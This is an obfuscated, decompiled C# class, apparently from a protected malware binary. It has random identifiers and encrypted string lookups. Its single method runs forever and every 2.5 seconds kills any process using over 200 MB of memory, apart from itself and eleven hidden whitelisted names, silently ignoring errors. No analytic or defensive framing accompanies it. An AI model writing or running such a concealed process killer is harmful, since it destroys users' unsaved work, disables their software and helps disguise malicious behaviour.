using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

public static class YNYWqufSjGiE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void hcxmeOpbdYP()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107405397)) && !process.ProcessName.Contains(getString_0(107405356)) && !process.ProcessName.Contains(getString_0(107405347)) && !process.ProcessName.Contains(getString_0(107405370)) && !process.ProcessName.Contains(getString_0(107405325)) && !process.ProcessName.Contains(getString_0(107405344)) && !process.ProcessName.Contains(getString_0(107405331)) && !process.ProcessName.Contains(getString_0(107405286)) && !process.ProcessName.Contains(getString_0(107405305)) && !process.ProcessName.Contains(getString_0(107405260)) && !process.ProcessName.Contains(getString_0(107405271)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static YNYWqufSjGiE()
	{
		Strings.CreateGetStringDelegate(typeof(YNYWqufSjGiE));
	}
}
